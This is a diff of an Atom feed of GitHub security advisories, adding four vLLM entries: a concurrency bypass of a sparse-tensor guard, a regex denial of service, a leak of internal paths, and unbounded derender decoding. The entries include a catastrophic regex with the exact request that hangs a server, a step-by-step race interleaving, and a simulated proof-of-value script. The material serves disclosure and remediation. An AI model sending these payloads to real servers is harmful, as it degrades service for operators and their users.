@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-09-04T21:08:13.802Z</updated>
+    <updated>2026-09-04T23:32:09.197Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,599 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[vllm]  vLLM: Incomplete CVE-2025-62164 remediation can be bypassed by concurrent prompt parts]]></title>
+        <id>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</id>
+        <link href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87"/>
+        <updated>2026-09-04T21:39:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="executive-summary">Executive Summary</h2>
+<p>The follow-up protection for CVE-2025-62164 is incomplete at vLLM revision <code>26587f9519e22a5c4549ead7595ad9ca3229c4fd</code>. It wraps serialized prompt-embedding reconstruction and dense conversion in <code>torch.sparse.check_sparse_tensor_invariants()</code>, but PyTorch 2.11.0 implements that context with save/enable/restore operations over process-global state. Two prompt-embedding parts in one <code>/v1/chat/completions</code> request are gathered concurrently on the event loop's default executor. When one context exits before the other loads its tensor, it can restore the global flag to <code>False</code> while the second part remains inside its guard.</p>
+<p>In a deterministic run against hash-verified source from the affected revision, the actual target loader rejected an invalid sparse payload as a negative control. The frozen chat tracker then scheduled benign and malicious parts on distinct <code>asyncio_0</code> and <code>asyncio_1</code> threads. The benign context exited, the malicious loader observed the invariant flag disabled, and <code>torch.load(weights_only=True)</code> reconstructed indices <code>[[10], [10]]</code> for a declared shape of <code>[3, 3]</code>. The run intercepted the target's <code>to_dense()</code> call before it operated on the invalid tensor.</p>
+<p>This primary trigger requires <code>--enable-prompt-embeds</code>, which is default-off, but it does <strong>not</strong> require <code>renderer_num_workers &gt; 1</code>, a multimodal model, or <code>--enable-mm-embeds</code>. API authentication is optional in the stock server: middleware is installed only when CLI or environment API keys are supplied.</p>
+<p>The lab proves bypass of the follow-up guard, invalid sparse reconstruction, and guarded-sink reachability. Crash and memory-corruption consequences are conditional on the behavior documented by the published CVE.</p>
+<h2 id="background">Background</h2>
+<p>CVE-2025-62164 / <a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-mrw7-hf4f-83pf">GHSA-mrw7-hf4f-83pf</a> concerns client-controlled serialized <code>prompt_embeds</code> reaching <code>torch.load(weights_only=True)</code> and an invalid sparse tensor reaching <code>to_dense()</code>. The advisory attributes memory corruption, denial of service, and potential code execution to that historical unsafe operation.</p>
+<p>The remediation chronology matters for duplicate handling:</p>
+<ul>
+<li>PR <a href="https://github.com/vllm-project/vllm/pull/27204">#27204</a>, merge commit <a href="https://github.com/vllm-project/vllm/commit/58fab50d82838d5014f4a14d991fdb9352c9c84b"><code>58fab50d82838d5014f4a14d991fdb9352c9c84b</code></a> on 2025-10-22, introduced the default-off <code>enable_prompt_embeds</code> gate. It did not add the sparse-invariant context.</li>
+<li>Commit <a href="https://github.com/vllm-project/vllm/commit/84e23d103d3483f944780d0d42bcf0993fd27e3a"><code>84e23d103d3483f944780d0d42bcf0993fd27e3a</code></a> on 2025-12-15, titled <code>additional protection for CVE-2025-62164 (#30649)</code>, added the process-global sparse-invariant context around load, type check, and dense conversion.</li>
+<li>Refactor commit <a href="https://github.com/vllm-project/vllm/commit/f0a1c8453ad1c664c8a04c83fe545195fcd556eb"><code>f0a1c8453ad1c664c8a04c83fe545195fcd556eb</code></a> on 2026-01-31 moved the guarded loader into <code>vllm/renderers/embed_utils.py</code> while preserving the same context.</li>
+<li>Chat content-part commit <a href="https://github.com/vllm-project/vllm/commit/14043dfecd35dd2f12b4d51eb9fa166184a0ca0f"><code>14043dfecd35dd2f12b4d51eb9fa166184a0ca0f</code></a> on 2026-05-01 introduced <code>prompt_embeds</code> chat parts and the concurrent one-request schedule described here.</li>
+</ul>
+<p>This report therefore does not present the malformed sparse payload or <code>to_dense()</code> sink as new. It reports a distinct concurrency root cause and trigger: unsynchronized save/enable/restore of the process-global follow-up guard, reachable through the later multi-part chat scheduler.</p>
+<p>The affected revision pins PyTorch 2.11.0 in <code>pyproject.toml:10</code>.</p>
+<h2 id="vulnerability-details">Vulnerability Details</h2>
+<p>The target's <code>safe_load_prompt_embeds</code> performs the guarded operation in <code>vllm/renderers/embed_utils.py:16-39</code>:</p>
+<pre><code class="language-python">with torch.sparse.check_sparse_tensor_invariants():
+    tensor = torch.load(
+        BytesIO(pybase64.b64decode(embed, validate=True)),
+        weights_only=True,
+        map_location=torch.device("cpu"),
+    )
+    if not isinstance(tensor, torch.Tensor):
+        raise VLLMValidationError(...)
+    tensor = tensor.to_dense()
+</code></pre>
+<p>The context is not request-local. With the global flag initially disabled, we can describe the verified interleaving:</p>
+<ol>
+<li>Benign part A enters, saves <code>False</code>, and enables the flag.</li>
+<li>Malicious part B enters, saves <code>True</code>, and leaves the flag enabled.</li>
+<li>A completes its load and exits, restoring its saved <code>False</code> value.</li>
+<li>B remains lexically inside its context but observes the actual global flag as <code>False</code>.</li>
+<li>B's <code>torch.load(..., weights_only=True)</code> reconstructs the malformed sparse tensor.</li>
+<li>The target reaches <code>tensor.to_dense()</code> before later rank, hidden-size, and dtype checks.</li>
+</ol>
+<p><code>weights_only=True</code> constrains deserialization types; it does not compensate for a sparse invariant check that another request has disabled.</p>
+<p>The complete stock actor-to-sink chain, traced in the affected source, is:</p>
+<p><code>POST /v1/chat/completions</code> (<code>vllm/entrypoints/openai/chat_completion/api_router.py:41-61</code>) -&gt; <code>OpenAIServingChat.create_chat_completion</code> -&gt; <code>_create_chat_completion</code> -&gt; <code>render_chat_request</code> (<code>vllm/entrypoints/openai/chat_completion/serving.py:206-280</code>) -&gt; <code>OnlineRenderer.render_chat</code> (<code>vllm/renderers/online_renderer.py:95-190</code>) -&gt; <code>preprocess_chat</code> (<code>vllm/renderers/online_renderer.py:335-380</code>) -&gt; <code>BaseRenderer.render_chat_async</code> (<code>vllm/renderers/base.py:1070-1105</code>) -&gt; <code>HfRenderer.render_messages_async</code> (<code>vllm/renderers/hf.py:1049-1085</code>) -&gt; <code>parse_chat_messages_async</code> (<code>vllm/entrypoints/chat_utils.py:1911-1945</code>) -&gt; content-part <code>parse_prompt_embeds</code> and <code>_load_prompt_embeds_async</code> (<code>vllm/entrypoints/chat_utils.py:1099-1120</code>) -&gt; <code>AsyncMultiModalItemTracker.resolve_items</code> (<code>vllm/entrypoints/chat_utils.py:818-835</code>) -&gt; <code>asyncio.gather</code> of both prompt parts -&gt; <code>safe_load_prompt_embeds_async</code> -&gt; <code>make_async</code> -&gt; <code>loop.run_in_executor(executor=None, ...)</code> (<code>vllm/utils/async_utils.py:28-45</code>) -&gt; guarded <code>torch.load</code> -&gt; <code>to_dense()</code>.</p>
+<p>The prompt async helper is created without an explicit executor, so it uses the event loop's default executor. This path is separate from the renderer's configurable pool. The deterministic scheduler run observed the two parts on distinct default-executor threads while leaving <code>renderer_num_workers</code> at its default of one.</p>
+<p><code>prompt_embeds</code> bypasses multimodal processing, and the tracker explicitly permits it when <code>is_multimodal_model=False</code> (<code>vllm/entrypoints/chat_utils.py:793-837</code>). Consequently, the primary trigger needs neither a multimodal model nor <code>enable_mm_embeds</code>.</p>
+<p>The source also states that async wrappers must be thread-safe (<code>vllm/utils/async_utils.py:28-38</code>), while a target test acknowledges that the sparse flag is not thread-local and concurrent users can leak state (<code>tests/renderers/test_sparse_tensor_validation.py:58-61</code>).</p>
+<h2 id="exploitability-analysis">Exploitability Analysis</h2>
+<p>The following evidence labels separate what was demonstrated from what remains conditional:</p>
+<table>
+<thead>
+<tr>
+<th>Label</th>
+<th>Claim</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>Verified by run</strong></td>
+<td>PyTorch 2.11.0 rejects the identical invalid payload through the actual target loader without the race.</td>
+</tr>
+<tr>
+<td><strong>Verified by run</strong></td>
+<td>The hash-verified frozen tracker schedules two prompt parts on distinct default-executor threads, races the flag to <code>False</code>, reconstructs the invalid sparse tensor, and reaches the target <code>to_dense()</code> call while the interception prevents execution.</td>
+</tr>
+<tr>
+<td><strong>Traced in source</strong></td>
+<td>A client can supply multiple <code>prompt_embeds</code> content parts through the stock <code>/v1/chat/completions</code> route and the function chain above.</td>
+</tr>
+<tr>
+<td><strong>Traced in source</strong></td>
+<td><code>enable_prompt_embeds</code> defaults to <code>False</code> (<code>vllm/config/model.py:255-260</code>), so the operator must opt in. <code>enable_mm_embeds</code> and non-default renderer workers are not preconditions for this path.</td>
+</tr>
+<tr>
+<td><strong>Traced in source</strong></td>
+<td><code>api_key</code> defaults to <code>None</code> (<code>vllm/entrypoints/openai/cli_args.py:264</code>), and authentication middleware is installed only when a CLI or environment key is present (<code>vllm/entrypoints/openai/api_server.py:306-310</code>). With a configured key, the attacker must authenticate; without one, the stock route has no API-key middleware.</td>
+</tr>
+<tr>
+<td><strong>Unrun</strong></td>
+<td>A live HTTP/GPU server, real-world race win rate, unsafe dense conversion, process crash, memory corruption, and reliable code execution.</td>
+</tr>
+</tbody></table>
+<p>The feature is documented for trusted users, which narrows intended exposure. It is not a memory-safety boundary: a user authorized to submit embedding inputs should not be able to disable a process-wide invariant for concurrent work.</p>
+<p>The current run proves the same invalid sparse object can cross the guard and reach the historical sink. If executing that sink retains the behavior described in CVE-2025-62164 for the deployed PyTorch build, denial of service or memory corruption may follow. This is a conditional impact statement, not a reproduced outcome. Reliable RCE is not claimed.</p>
+<p>The opt-in feature, scheduling requirement, and absence of a measured live win rate support <strong>Medium/P2</strong> despite the serious historical sink class. No additional deployment assumptions are required for the one-request scheduler beyond stock default-executor concurrency being available.</p>
+<h2 id="remediation">Remediation</h2>
+<p>The immediate fix is one shared process-wide lock around every use of this process-global sparse guard. The lock must cover invariant enabling, deserialization, tensor type validation, and dense conversion:</p>
+<pre><code class="language-python">with shared_sparse_load_lock:
+    with torch.sparse.check_sparse_tensor_invariants():
+        tensor = torch.load(..., weights_only=True, map_location="cpu")
+        validate_tensor_type(tensor)
+        tensor = tensor.to_dense()
+</code></pre>
+<p>Every prompt, image, and audio loader that manipulates the same global flag must use the same lock. A lock only around <code>torch.load</code>, separate per-loader locks, or a lock omitted from the chat helper would leave overlapping save/restore sequences possible.</p>
+<p>The stronger design is to avoid mutable process-global validation state in concurrent request code. Prefer a PyTorch per-call invariant check if one is available, or reconstruct and validate serialized embeddings inside a deliberately serialized boundary before any sparse operation.</p>
+<p>Regression coverage should:</p>
+<ul>
+<li>Preserve the actual-target negative control using the identical malformed payload.</li>
+<li>Force A-enter, B-enter, A-exit, B-load and assert B remains protected.</li>
+<li>Execute the multi-part chat tracker with the event loop's default executor and <code>renderer_num_workers=1</code>.</li>
+<li>Cover cross-loader overlap so later prompt, image, or audio changes cannot bypass a shared fix.</li>
+<li>Assert the global flag is restored after success and exceptions.</li>
+<li>Reject invalid tensors before any dense conversion.</li>
+</ul>
+<p>Until a fix is deployed, leaving <code>enable_prompt_embeds</code> disabled removes this stock source path.</p>
+<h2 id="summary">Summary</h2>
+<p>The affected vLLM revision uses a process-global PyTorch context as the follow-up protection for CVE-2025-62164. A later chat feature causes two prompt-embedding parts from one request to run concurrently on the default executor. One context can restore the flag to <code>False</code> while the other is still guarded, allowing the historical malformed sparse payload class to reach the historical <code>to_dense()</code> sink. The new issue is the concurrent guard bypass and shipped trigger, not the payload or sink. Runtime validation proves the bypass and safe sink reachability on PyTorch 2.11.0; historical crash and memory-corruption effects remain conditional, and RCE was not tested or claimed.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/vllm-project/vllm/security/advisories/GHSA-pr7f-p5mw-fc87</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73557">https://nvd.nist.gov/vuln/detail/CVE-2026-73557</a></li>
+<li><a href="https://github.com/vllm-project/vllm/pull/48583">https://github.com/vllm-project/vllm/pull/48583</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50">https://github.com/vllm-project/vllm/commit/793cf79c89d4049124e756915468ac30318f2e50</a></li>
+<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-pr7f-p5mw-fc87">https://github.com/advisories/GHSA-pr7f-p5mw-fc87</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pr7f-p5mw-fc87</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-04T21:39:02.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vllm] vLLM: ReDoS via structured_outputs.regex in the lm-format-enforcer backend (no compile timeout) — missed sibling of GHSA-rwxx-mrjm-wc2m]]></title>
+        <id>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</id>
+        <link href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v"/>
+        <updated>2026-09-04T21:37:01.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The fix for <code>GHSA-rwxx-mrjm-wc2m</code> ("ReDoS via <code>structured_outputs.regex</code> compiled without timeout") wrapped the regex compile in the <strong>xgrammar</strong> and <strong>outlines</strong> backends with <code>compile_regex_with_timeout</code> (and, for outlines, <code>validate_regex_is_buildable</code>). The <strong>lm-format-enforcer</strong> backend was left unguarded: it compiles the attacker-supplied regex with no timeout and no buildability check. A single request with a catastrophic regex hangs the structured-output compile step and stalls the engine worker (denial of service).</p>
+<h3 id="affected-code-head-d6d39c1">Affected code (HEAD d6d39c1)</h3>
+<p><code>vllm/v1/structured_output/backend_lm_format_enforcer.py</code>:</p>
+<ul>
+<li>line 110: <code>character_level_parser = lmformatenforcer.RegexParser(grammar_spec)</code> — builds an <code>interegular</code> FSM from the attacker regex synchronously, <strong>no timeout</strong>.</li>
+<li>line 155: <code>validate_structured_output_request_lm_format_enforcer</code> returns immediately on <code>if so_params.regex:</code> — <strong>no validation</strong>.</li>
+</ul>
+<p>Sibling backends that WERE patched by GHSA-rwxx:</p>
+<ul>
+<li><code>backend_xgrammar.py:92</code> → <code>compile_regex_with_timeout(...)</code>.</li>
+<li><code>backend_outlines.py:65</code> → <code>compile_regex_with_timeout(...)</code> (plus <code>validate_regex_is_buildable</code>).</li>
+</ul>
+<p>lm-format-enforcer uses the same <code>interegular</code> DFA-construction primitive the advisory cites for the outlines backend.</p>
+<h3 id="reproduction-runtime-verified-against-the-sink">Reproduction (runtime-verified against the sink)</h3>
+<p>The sink <code>lmformatenforcer.RegexParser(&lt;regex&gt;)</code> was exercised directly (this is exactly what the backend calls):</p>
+<pre><code>baseline  '[0-9]{3}'          -&gt; 0.0002 s
+attacker  '(a{1,300}){300}'   -&gt; DID NOT COMPLETE in 20 s (one core pegged at 100% in interegular FSM construction)
+</code></pre>
+<p>End-to-end: start <code>vllm serve &lt;model&gt; --structured-outputs-config '{"backend":"lm-format-enforcer"}'</code>, then <code>POST /v1/completions</code> with <code>{"structured_outputs":{"regex":"(a{1,300}){300}"}, ...}</code>. The request never returns; because grammar compile runs in the engine's structured-output path, concurrent requests stall = worker-level DoS. The identical request against the outlines backend is bounded by <code>compile_regex_with_timeout</code> and returns a clean error.</p>
+<h3 id="impact">Impact</h3>
+<p>Unauthenticated denial of service (vLLM ships with no authentication by default). One request pegs a CPU core and blocks the structured-output engine path.</p>
+<p><strong>Reachability precondition:</strong> the operator must have selected <code>backend=lm-format-enforcer</code> via <code>--structured-outputs-config</code> (the default is <code>auto</code> → xgrammar). This is the same opt-in tier as the outlines backend that GHSA-rwxx already covered.</p>
+<h3 id="suggested-remediation">Suggested remediation</h3>
+<p>Route the lm-format-enforcer regex compile (<code>backend_lm_format_enforcer.py:110</code>) through the same <code>compile_regex_with_timeout</code> guard already applied to the xgrammar and outlines backends, and reject un-buildable / oversized patterns in <code>validate_structured_output_request_lm_format_enforcer</code>.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/vllm-project/vllm/security/advisories/GHSA-48jh-3gj7-fg8v</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73556">https://nvd.nist.gov/vuln/detail/CVE-2026-73556</a></li>
+<li><a href="https://github.com/vllm-project/vllm/pull/47595">https://github.com/vllm-project/vllm/pull/47595</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577">https://github.com/vllm-project/vllm/commit/c9a788eedc412acceaa5112e0d44624b49841577</a></li>
+<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-48jh-3gj7-fg8v">https://github.com/advisories/GHSA-48jh-3gj7-fg8v</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-48jh-3gj7-fg8v</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-04T21:37:00.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vllm] vLLM: Unauthenticated Internal Path and Username Disclosure via Validation Error Messages]]></title>
+        <id>https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</id>
+        <link href="https://github.com/advisories/GHSA-hwrm-c4cx-rf4j"/>
+        <updated>2026-09-04T21:36:35.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>When the vLLM API receives a malformed request (e.g., invalid JSON or missing required fields), FastAPI raises a Pydantic <code>RequestValidationError</code>. The <code>validation_exception_handler</code> in <code>vllm/entrypoints/openai/server_utils.py</code> converts this exception to a string via <code>str(exc)</code>, which includes the internal file path and line number of the handler function. The existing <code>sanitize_message()</code> function in <code>vllm/entrypoints/utils.py</code> strips memory addresses (e.g., <code>0x7f...</code>) but does not strip <code>File "...", line X</code> patterns. The result is a user-facing HTTP response that leaks internal system information.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker can extract the following with a single malformed request:</p>
+<ul>
+<li><strong>OS username</strong> running the vLLM process (e.g., <code>ubuntu</code>)</li>
+<li><strong>Home directory path</strong> (e.g., <code>/home/ubuntu/</code>)</li>
+<li><strong>Virtual environment path</strong> (e.g., <code>vllm-env/</code>)</li>
+<li><strong>Python version</strong> (e.g., <code>3.12</code>)</li>
+<li><strong>Internal package structure and line numbers</strong> (e.g., <code>vllm/entrypoints/openai/chat_completion/api_router.py</code>)</li>
+<li><strong>Handler function names per endpoint</strong>, enabling precise version fingerprinting</li>
+</ul>
+<p>This information aids attackers in constructing targeted exploits: environment paths narrow the attack surface, and handler function names + line numbers enable exact version identification even when the <code>/version</code> endpoint is disabled.</p>
+<p>All POST endpoints that accept JSON bodies are affected, including <code>/v1/chat/completions</code>, <code>/v1/completions</code>, <code>/tokenize</code>, and <code>/detokenize</code>.</p>
+<h2 id="workarounds">Workarounds</h2>
+<p>Deploying vLLM behind a reverse proxy that rewrites error response bodies to strip file paths would mitigate this, though it is fragile.</p>
+<h2 id="remediation-recommendation">Remediation Recommendation</h2>
+<p>Two possible fixes (either suffices):</p>
+<p><strong>Option A — Fix <code>validation_exception_handler</code>:</strong> Construct the error message from <code>exc.errors()</code> (the structured Pydantic error list) rather than <code>str(exc)</code>. This avoids the traceback-style string entirely.</p>
+<p><strong>Option B — Fix <code>sanitize_message</code>:</strong> Add a regex to strip <code>File "...", line \d+</code> patterns, similar to how memory addresses are already stripped:</p>
+<pre><code class="language-python">import re
+msg = re.sub(r'File ".*?", line \d+, in \w+', '[internal]', msg)
+</code></pre>
+<p>Option A is preferred as it addresses the root cause rather than filtering symptoms.</p>
+<h2 id="environment-tested">Environment Tested</h2>
+<ul>
+<li>vLLM 0.20.1 (pip install, latest stable as of May 2026)</li>
+<li>Python 3.12</li>
+<li>Ubuntu 22.04</li>
+<li>Model: Qwen/Qwen2-0.5B (text-only; bug is model-independent)</li>
+</ul>
+<p>This was fixed here: <a href="https://github.com/vllm-project/vllm/commit/e87521626f">https://github.com/vllm-project/vllm/commit/e87521626f</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/vllm-project/vllm/security/advisories/GHSA-hwrm-c4cx-rf4j">https://github.com/vllm-project/vllm/security/advisories/GHSA-hwrm-c4cx-rf4j</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-73555">https://nvd.nist.gov/vuln/detail/CVE-2026-73555</a></li>
+<li><a href="https://github.com/vllm-project/vllm/pull/46415">https://github.com/vllm-project/vllm/pull/46415</a></li>
+<li><a href="https://github.com/vllm-project/vllm/commit/e87521626febe2763f997691d1599de4175f4324">https://github.com/vllm-project/vllm/commit/e87521626febe2763f997691d1599de4175f4324</a></li>
+<li><a href="https://github.com/vllm-project/vllm/releases/tag/v0.26.0">https://github.com/vllm-project/vllm/releases/tag/v0.26.0</a></li>
+<li><a href="https://github.com/advisories/GHSA-hwrm-c4cx-rf4j">https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hwrm-c4cx-rf4j</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-04T21:36:33.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[vllm] vLLM: Derender endpoints decode caller-supplied GenerateResponse token IDs without output bounds]]></title>
+        <id>https://github.com/advisories/GHSA-8737-qx52-hjff</id>
+        <link href="https://github.com/advisories/GHSA-8737-qx52-hjff"/>
+        <updated>2026-09-04T21:32:09.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The <code>/v1/completions/derender</code> and <code>/v1/chat/completions/derender</code> endpoints accept caller-supplied <code>GenerateResponse</code> objects and postprocess every nested <code>choices[*].token_ids</code> list directly. Unlike the normal render/generate path, derender does not enforce model context length, resolved <code>max_tokens</code>, <code>max_num_seqs</code>, choice-count, or response-size bounds before detokenizing and returning the supplied token IDs. An authenticated API client can therefore make the CPU-only render frontend, or any server exposing these <code>/v1</code> derender routes, spend CPU and memory proportional to attacker-chosen generated-output-shaped JSON rather than to a bounded generation result.</p>
+<h2 id="technical-details">Technical Details</h2>
+<p>The render router registers <code>/v1/chat/completions/derender</code> and <code>/v1/completions/derender</code> in <code>vllm/entrypoints/serve/render/api_router.py</code>, and the OpenAI API server attaches this router whenever <code>"generate"</code> or <code>"render"</code> is in <code>supported_tasks</code> (<code>vllm/entrypoints/openai/api_server.py</code>). The routes are under <code>/v1</code>, so they are part of the OpenAI-compatible HTTP API surface and are protected by the API-key middleware when <code>--api-key</code> is configured.</p>
+<p>The request types trust generated-output-shaped data from the client. In <code>vllm/entrypoints/serve/disagg/protocol.py</code>, <code>GenerateResponseChoice</code> accepts <code>token_ids: list[int] | None = None</code>, <code>GenerateResponse</code> accepts <code>choices: list[GenerateResponseChoice]</code>, and <code>DerenderCompletionRequest</code> accepts <code>generate_responses: list[GenerateResponse]</code>. These fields have no max length, max item count, or relationship to a prior <code>GenerateRequest</code>.</p>
+<p>The sink is <code>OnlineDerenderer</code>. <code>derender_completion()</code> iterates every supplied <code>generate_responses</code> entry and every nested choice, calls <code>tokenizer.decode(choice.token_ids, skip_special_tokens=True)</code>, appends the decoded text to the response choices, and increments <code>total_completion_tokens</code> from the same supplied list length. <code>derender_chat()</code> has the same shape for a single supplied <code>generate_response</code>, and can also feed the decoded text into tool/reasoning parsers when a parser and <code>chat_request</code> are present. <code>ServingRender.derender_completion_response()</code> calls <code>online_derenderer.derender_completion(request.generate_responses, request.prompt_tokens)</code> before applying any completion-level validation beyond the model check.</p>
+<p>Normal render and generation paths derive output limits from <code>max_model_len</code>, the rendered prompt length, request <code>max_tokens</code> / <code>max_completion_tokens</code>, and scheduler limits. Derender bypasses that invariant because it accepts the already-generated output shape directly from the HTTP caller. The missing invariant is: derender should only postprocess bounded generated output, and client-supplied derender payloads must be rejected if their nested generated token/logprob structures exceed the same limits that generation would have enforced.</p>
+<h2 id="pov">PoV</h2>
+<p>The following bounded PoV can be run from a current vLLM checkout containing PR <code>#43606</code>. It asserts the current source facts for the derender routes, unchecked request fields, and decode sink, then simulates the same derender loop with a counting tokenizer. The negative control is a one-choice, 32-token response. The amplified payload keeps the test bounded but demonstrates that all decoded work and returned text scale directly with caller-supplied <code>GenerateResponse</code> contents.</p>
+<pre><code class="language-python">#!/usr/bin/env python3
+import subprocess
+from dataclasses import dataclass
+from pathlib import Path
+
+SOURCE = Path(".")
+
+def require_source_fact(path: str, needles: list[str]) -&gt; None:
+    text = (SOURCE / path).read_text()
+    missing = [needle for needle in needles if needle not in text]
+    if missing:
+        raise AssertionError(f"{path} missing expected facts: {missing}")
+
+def source_head() -&gt; str:
+    return subprocess.check_output(["git", "rev-parse", "HEAD"], cwd=SOURCE, text=True).strip()
+
+@dataclass
+class Choice:
+    index: int
+    token_ids: list[int]
+
+@dataclass
+class GenerateResponse:
+    request_id: str
+    choices: list[Choice]
+
+class CountingTokenizer:
+    def __init__(self) -&gt; None:
+        self.decode_calls = 0
+        self.decoded_ids = 0
+    def decode(self, token_ids: list[int], *, skip_special_tokens: bool = True) -&gt; str:
+        self.decode_calls += 1
+        self.decoded_ids += len(token_ids)
+        return "x" * len(token_ids)
+
+def derender_completion_like_current_head(generate_responses: list[GenerateResponse], tokenizer: CountingTokenizer) -&gt; tuple[int, int, int]:
+    output_chars = 0
+    choices = 0
+    total_completion_tokens = 0
+    for gen in generate_responses:
+        for choice in gen.choices:
+            if not choice.token_ids:
+                raise ValueError("choice has empty or null token_ids")
+            decoded_text = tokenizer.decode(choice.token_ids, skip_special_tokens=True)
+            output_chars += len(decoded_text)
+            total_completion_tokens += len(choice.token_ids)
+            choices += 1
+    return choices, total_completion_tokens, output_chars
+
+def make_payload(responses: int, choices_per_response: int, tokens_per_choice: int) -&gt; list[GenerateResponse]:
+    token_ids = [42] * tokens_per_choice
+    return [GenerateResponse(request_id=f"gen-{r}", choices=[Choice(index=c, token_ids=list(token_ids)) for c in range(choices_per_response)]) for r in range(responses)]
+
+def run_case(name: str, payload: list[GenerateResponse]) -&gt; None:
+    tokenizer = CountingTokenizer()
+    choices, completion_tokens, output_chars = derender_completion_like_current_head(payload, tokenizer)
+    print(f"{name}: responses={len(payload)} choices={choices} decode_calls={tokenizer.decode_calls} decoded_token_ids={tokenizer.decoded_ids} completion_tokens={completion_tokens} output_chars={output_chars}")
+
+require_source_fact("vllm/entrypoints/serve/render/api_router.py", ['"/v1/completions/derender"', '"/v1/chat/completions/derender"', "app.include_router(router)"])
+require_source_fact("vllm/entrypoints/serve/disagg/protocol.py", ["class GenerateResponseChoice(BaseModel):", "token_ids: list[int] | None = None", "class GenerateResponse(BaseModel):", "choices: list[GenerateResponseChoice]", "class DerenderCompletionRequest(BaseModel):", "generate_responses: list[GenerateResponse]"])
+require_source_fact("vllm/renderers/online_derenderer.py", ["async def derender_completion(", "for gen, pt in zip(generate_responses, prompt_tokens_list):", "for choice in gen.choices:", "decoded_text = tokenizer.decode(", "total_completion_tokens += len(choice.token_ids)"])
+print("source_checks=ok")
+print(f"source_head={source_head()}")
+run_case("negative_control", make_payload(responses=1, choices_per_response=1, tokens_per_choice=32))
+run_case("amplified_payload", make_payload(responses=16, choices_per_response=4, tokens_per_choice=8192))
+print("observation=derender decodes every caller-supplied token id before any max_model_len, max_tokens, max_num_seqs, or response-size check")
+</code></pre>
+<h2 id="impact">Impact</h2>
+<p>An attacker with access to the <code>/v1</code> API can send derender requests that consume CPU and memory in the frontend/postprocessing process and can cause large responses unrelated to any bounded generation. In disaggregated deployments, this affects the CPU-only render frontend; in servers where the render router is attached alongside generation, it affects the same OpenAI-compatible server process that handles normal client traffic. This can degrade availability for other clients sharing the process.</p>
+<p>Likely CWE: CWE-400 (Uncontrolled Resource Consumption) / CWE-770 (Allocation of Resources Without Limits or Throttling). Conservative CVSS v3.1: <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L</code> (4.3). This is not Low severity because a regular network API client can induce availability impact in a shared service without local access, invalid model artifacts, or special runtime privileges. If the server is deployed without API-key enforcement for <code>/v1</code>, the privileges component becomes <code>PR:N</code>.</p>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>Validate derender payloads before any detokenization or parser invocation. Apply bounded limits to <code>generate_response(s)</code>, <code>choices</code>, <code>token_ids</code>, <code>prompt_logprobs</code>, <code>logprobs.content</code>, <code>top_logprobs</code>, and <code>routed_experts</code> that are at least as strict as the corresponding generation-side limits. For completions, reject <code>generate_responses</code> counts above the number of prompts that <code>/v1/completions/render</code> would have produced, and reject total nested choice counts above <code>max_num_seqs</code> / <code>n</code> limits. For each choice, reject <code>token_ids</code> longer than the resolved output-token budget, or require derender callers to submit the original bounded <code>GenerateRequest</code> / sampling metadata and validate the <code>GenerateResponse</code> against it before decoding.</p>
